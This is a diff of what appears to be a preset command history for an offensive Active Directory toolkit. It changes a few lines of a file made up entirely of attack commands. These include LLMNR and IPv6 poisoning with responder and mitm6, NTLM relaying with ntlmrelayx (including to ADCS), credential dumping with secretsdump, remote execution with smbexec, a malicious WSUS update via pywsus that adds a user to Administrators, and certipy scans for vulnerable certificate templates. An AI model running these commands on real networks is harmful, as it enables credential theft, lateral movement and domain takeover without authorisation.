@@ -35,7 +35,7 @@ pth-net rpc group addmem 'Domain admins' 'Shutdown' -U 'BREAKING.BAD'/'Administr
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain BREAKING.BAD
-responder --interface eth0 --NBTNSdomain --wpad --lm --ProxyAuth
+responder --interface eth0 --wpad --lm --ProxyAuth
 ntlmrelayx -tf targets.txt -w -6 -smb2support -socks
 proxychains secretsdump -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains smbexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
@@ -306,7 +306,6 @@ nth --text 5f4dcc3b5aa765d61d8327deb882cf99
 pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
 DonPAPI.py breaking.bad/someadmin:somepassword@sometarget
 webclientservicescanner -dc-ip dc01.domain.local domain.local/user:password@dc01.domain.local
-webclientservicescanner -dc-ip dc01.domain.local domain.local/user:password@
 ntlmrelayx -t http://pki.domain.local/certsrv/certfnsh.asp --adcs
 certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' auto -scheme ldap -user 'administrator'
 certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' find -scheme ldap -vulnerable
